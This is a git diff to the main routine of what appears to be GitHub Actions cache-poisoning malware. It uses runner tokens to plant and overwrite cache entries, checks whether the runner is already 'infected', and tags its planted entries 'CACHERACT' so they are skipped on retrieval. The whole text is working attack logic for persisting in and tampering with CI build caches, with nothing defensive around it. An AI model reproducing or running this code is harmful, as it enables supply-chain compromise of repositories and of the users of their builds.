@@ -237,16 +237,18 @@ async function main() {
         await sleep(SLEEP_TIMER * 1000);
     }
 
-
-    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
-        if (!isInfected()) {
-            await createAndSetEntry(1801840148, "FILLER", "bceda5fc9790311ca62ca27a213556fe42fbb764a6135a3ce6521f9e2ab44b91", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "bceda5fc9790311ca62ca27a213556fe42fbb764a6135a3ce6521f9e2ab44b91", accessToken, cacheServerUrl);
-        }
+    if (githubToken && accessToken && cacheServerUrl) {
         process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
+   
+        if (!isInfected()) {
+            await createAndSetEntry(1801840148, "FILLER", "CACHERACT", accessToken, cacheServerUrl);
+            await createAndSetEntry(1801840148, "FILLER", "CACHERACT", accessToken, cacheServerUrl);
+        }
+    }
 
+    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
         const entries = await listCacheEntries(githubToken);
         let clearEntryFailed = false;
         try {
@@ -305,7 +307,7 @@ async function main() {
                     if (currBranch !== ref) {
                         // Entry is not in the default branch, create a new entry
                         path = await createEntry(size);
-                    } else {
+                    } else if ("CACHERACT" !== version) {
                         // Entry is in default branch, retrieve it
                         path = await retrieveEntry(key, version, accessToken, cacheServerUrl);
                     }
